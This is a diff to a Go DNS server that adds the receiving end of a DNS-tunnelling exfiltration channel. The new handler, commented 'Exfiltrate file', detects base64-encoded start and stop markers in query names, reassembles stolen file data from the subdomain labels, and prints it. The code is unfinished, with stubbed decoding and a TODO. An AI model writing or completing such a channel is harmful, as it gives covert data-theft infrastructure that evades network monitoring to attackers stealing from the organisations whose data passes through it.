@@ -6,6 +6,7 @@ import (
 	"log"
 	"flag"
 	"errors"
+	"strings"
 	// "regexp"
 	"strconv"
 	"os/exec"
@@ -14,6 +15,14 @@ import (
 	"github.com/miekg/dns"
 )
 
+//Exfiltrate file
+var file string
+//Connection status
+var connection bool
+//CRC
+var crc string
+//domain
+var domain string
 
 type Config struct {
 	Server ServerConfig `yaml:"server"`
@@ -64,12 +73,42 @@ func buildClient(server ServerConfig, projectDir string) error {
 	return nil
 }
 
+func done() bool {
+	//check src
+
+	//decode from base64
+
+	//printfile
+	fmt.Println(file)
+	file = ""
+	return true
+}
+
 func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
+
 	// Log the received query
 	for _, question := range r.Question {
-		log.Printf("Received query for: %s", question.Name)
+		if strings.Contains(question.Name, ".ZG5zZXJjX3N0YXJ0X21lc3NhZ2Ug."){
+			connection = true
+			crc = strings.Split(question.Name, ".")[0]
+		} else {
+			if connection {
+				if strings.Contains(question.Name, "ZG5zZXJjX3N0b3BfbWVzc2FnZSAg.") {
+					connection = false
+					done()
+				} else {
+					data := strings.Split(question.Name[:len(question.Name)-len(domain)-1], ".")
+					for i := len(data) -1; i >= 0; i-- {
+						file += data[i]
+					}
+				}
+			}
+		}
+		// log.Printf("Received query for: %s", question.Name)
 	}
 
+
+	//TODO: resend request
 	// Create a response
 	m := new(dns.Msg)
 	m.SetReply(r)
@@ -121,6 +160,8 @@ func main() {
 	}
 
 	if *serve {
+		domain = config.Server.Domain
+
 		dns.HandleFunc(".", handleDNSRequest) // Handle all queries
 
 		server := &dns.Server{Addr: fmt.Sprintf(":%d", config.Server.Port), Net: "udp"}
